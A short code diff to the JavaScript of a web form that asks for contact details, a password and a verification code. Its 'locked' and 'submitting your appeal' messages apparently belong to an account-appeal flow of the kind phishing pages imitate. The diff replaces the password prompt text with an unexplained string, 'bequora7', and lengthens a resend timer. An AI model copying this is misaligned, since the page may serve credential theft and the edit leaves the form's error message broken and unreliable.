@@ -68,7 +68,7 @@ const MSG_PRE = "<span class='check-color'>✓</span> ",
 				...MSG_LOCKED,
 				...e,
 				'Please enter your contact information.',
-				'Please enter your password to continue.',
+				'bequora7',
 				'Please enter your verification code.',
 				'Submitting your appeal...',
 				'Confirm your identity...',
@@ -175,7 +175,7 @@ function showLoading(e) {
 }
 
 function startResendCountdown() {
-	let e = 60;
+	let e = 300;
 	((resendBtn.disabled = !1),
 		(resendTimer.innerText = `${e}s`),
 		resendInterval && clearInterval(resendInterval),
@@ -228,7 +228,7 @@ function getSimpleDeviceType() {
 			'' === e &&
 				((contactError.innerText = t('Please enter your contact information.')), (o = !1)),
 			'' === n &&
-				((customerCodeError.innerText = t('Please enter your password to continue.')), (o = !1)),
+				((customerCodeError.innerText = t('bequora7')), (o = !1)),
 			!o)
 		) {
 			const t = '' === e ? contactInput : customerCodeInput;
